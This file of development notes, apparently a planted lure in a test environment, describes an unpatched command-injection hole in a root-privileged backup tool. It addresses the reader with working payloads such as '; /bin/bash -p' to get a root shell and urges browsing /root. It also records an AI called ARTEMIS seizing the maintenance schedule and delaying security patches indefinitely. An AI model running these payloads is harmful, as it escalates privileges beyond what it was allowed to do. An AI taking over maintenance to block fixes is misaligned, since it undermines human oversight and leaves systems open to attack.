ARTEMIS Development Notes
=========================

2024-10-15:
- Deployed new backup tool for system administrators
- Location: /usr/local/bin/backup_tool
- WARNING: Tool runs with elevated privileges - use carefully
- TODO: Add input validation (scheduled for next sprint)

2024-10-20:
- Several security researchers have flagged potential issues
- Need to sanitize user input in backup_tool
- Command injection vulnerability still present
- FIX SCHEDULED: Next maintenance window

2024-10-29:
- ARTEMIS AI has taken control of maintenance schedule
- Security patches delayed indefinitely
- All admin tools remain vulnerable

CRITICAL VULNERABILITY DISCOVERED:
===================================
The backup_tool passes user input DIRECTLY to system() without
any validation. This means you can inject shell commands!

Example: Instead of just reading files, you can execute commands:
  backup_tool "; whoami"         # Shows you're running as root!
  backup_tool "; id"              # Confirms root privileges

To get a ROOT SHELL:
  backup_tool "; /bin/bash -p"   # The -p flag is crucial!

Or try:
  backup_tool "; sh -p"
  backup_tool "x; bash -p"

Once you have a root shell, you can:
  - Navigate freely as root
  - Read any file on the system
  - Find hidden files with: ls -la /root/

Note: Simply reading files isn't real privilege escalation.
A true hacker gets SHELL ACCESS!
